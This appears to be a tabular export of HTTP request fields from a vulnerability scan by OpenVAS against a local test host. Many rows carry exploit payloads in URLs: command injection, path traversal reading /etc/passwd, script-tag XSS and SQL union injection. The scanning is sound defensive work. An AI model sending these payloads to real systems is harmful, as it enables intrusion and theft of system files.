http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15580						1	http://192.168.1.104/cgi-bin/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15581						1	http://192.168.1.104/web/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/directory.php?dir=%3Bcat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/directory.php?dir=%3Bcat%20/etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15587						1	http://192.168.1.104/cgi-bin/directory.php?dir=%3Bcat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/directory.php?dir=%3Bcat%20/etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15588						1	http://192.168.1.104/web/directory.php?dir=%3Bcat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/directory.php?dir=%3Bcat%20/etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/phpdir/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/phpdir/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15594						1	http://192.168.1.104/resources/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/resources/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/dlguard/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/dlguard/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15601						1	http://192.168.1.104/dlg/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/dlg/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15602						1	http://192.168.1.104/store/dlg/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/store/dlg/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15603						1	http://192.168.1.104/cbdm/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cbdm/cart/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15604						1	http://192.168.1.104/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15605						1	http://192.168.1.104/cgi-bin/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15606						1	http://192.168.1.104/web/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/index.php?page=1&c=&searchCart="><script>alert(/openvasvt/)</script>
*/*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/EXCU_SHELL		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/EXCU_SHELL
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/web/login.html		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/login.html
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/dl_stats/download.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/dl_stats/download.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15622						1	http://192.168.1.104/download.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/download.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15623						1	http://192.168.1.104/cgi-bin/download.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/download.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15624						1	http://192.168.1.104/web/download.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/download.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/dnet/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/dnet/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15630						1	http://192.168.1.104/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15631						1	http://192.168.1.104/cgi-bin/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15632						1	http://192.168.1.104/web/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/team.rc5-72.php?showlang=../../../../../../../../../etc/passwd%00
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/doceboLms/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/doceboLms/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15638						1	http://192.168.1.104/doceboKms/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/doceboKms/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15639						1	http://192.168.1.104/doceboCms/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/doceboCms/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15640						1	http://192.168.1.104/doceboCore/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/doceboCore/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/docmgr/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/docmgr/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15650						1	http://192.168.1.104/DocMGR/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/DocMGR/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/Mercury/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/Mercury/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/dolphin/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/dolphin/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15661						1	http://192.168.1.104/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15662						1	http://192.168.1.104/cgi-bin/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15663						1	http://192.168.1.104/web/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/gzip_loader.php?file=../../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/application/login/login.html		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/application/login/login.html
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15669						1	http://192.168.1.104/dotcms/application/login/login.html		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/dotcms/application/login/login.html
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15670						1	http://192.168.1.104/cms/application/login/login.html		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cms/application/login/login.html
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15672						1	http://192.168.1.104/cgi-bin/application/login/login.html		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/application/login/login.html
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15673						1	http://192.168.1.104/web/application/login/login.html		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/application/login/login.html
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/apoll/admin/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/apoll/admin/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15679						1	http://192.168.1.104/poll/admin/login.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/poll/admin/login.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/apoll/admin/lost-pass.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/apoll/admin/lost-pass.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15685						1	http://192.168.1.104/poll/admin/lost-pass.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/poll/admin/lost-pass.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15686						1	http://192.168.1.104/admin/lost-pass.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/admin/lost-pass.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15687						1	http://192.168.1.104/cgi-bin/admin/lost-pass.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/admin/lost-pass.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15688						1	http://192.168.1.104/web/admin/lost-pass.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/admin/lost-pass.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/index.php?p='vt-test		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/index.php?p='vt-test
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15694						1	http://192.168.1.104/cgi-bin/index.php?p='vt-test		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/index.php?p='vt-test
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15696						1	http://192.168.1.104/web/index.php?p='vt-test		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/index.php?p='vt-test
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/ServerAdmin/UserLogin.jsp		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/ServerAdmin/UserLogin.jsp
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/cms/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cms/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15714						1	http://192.168.1.104/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15715						1	http://192.168.1.104/cgi-bin/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15716						1	http://192.168.1.104/web/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/dynpage/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/dynpage/index.php
											max-age=0																192.168.1.104															1	http://192.168.1.104/ea-gBook/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/ea-gBook/index.php?seite=0
											max-age=0																192.168.1.104									15728						1	http://192.168.1.104/gbuch/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/gbuch/index.php?seite=0
											max-age=0																192.168.1.104									15730						1	http://192.168.1.104/gb/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/gb/index.php?seite=0
											max-age=0																192.168.1.104									15731						1	http://192.168.1.104/guestbook/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/guestbook/index.php?seite=0
											max-age=0																192.168.1.104									15732						1	http://192.168.1.104/Gaestebuch/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/Gaestebuch/index.php?seite=0
											max-age=0																192.168.1.104									15733						1	http://192.168.1.104/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/index.php?seite=0
											max-age=0																192.168.1.104									15734						1	http://192.168.1.104/cgi-bin/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/cgi-bin/index.php?seite=0
											max-age=0																192.168.1.104									15735						1	http://192.168.1.104/web/index.php?seite=0		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)			PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6	/web/index.php?seite=0
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/easymsgb.pl?print=|id|		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/easymsgb.pl?print=|id|
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15741						1	http://192.168.1.104/cgi-bin/easymsgb.pl?print=|id|		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/easymsgb.pl?print=|id|
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15742						1	http://192.168.1.104/web/easymsgb.pl?print=|id|		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/easymsgb.pl?print=|id|
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/esev2/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/esev2/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15748						1	http://192.168.1.104/esev/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/esev/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/eclime/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/eclime/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15754						1	http://192.168.1.104/eclime/catalog/index.php		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/eclime/catalog/index.php
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/help/index.jsp		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/help/index.jsp
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/ecoder/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/ecoder/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/editwrx/wrx.cgi		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/editwrx/wrx.cgi
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15770						1	http://192.168.1.104/wrx.cgi		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/wrx.cgi
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15771						1	http://192.168.1.104/cgi-bin/wrx.cgi		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/wrx.cgi
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15772						1	http://192.168.1.104/web/wrx.cgi		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/web/wrx.cgi
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104															1	http://192.168.1.104/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*		en									no-cache						Keep-Alive										192.168.1.104									15785						1	http://192.168.1.104/cgi-bin/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*		GET				HTTP/1.1																			Mozilla/5.0 [en] (X11, U; OpenVAS-VT 21.4.3)				/cgi-bin/news.php4?nid=-12'+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*
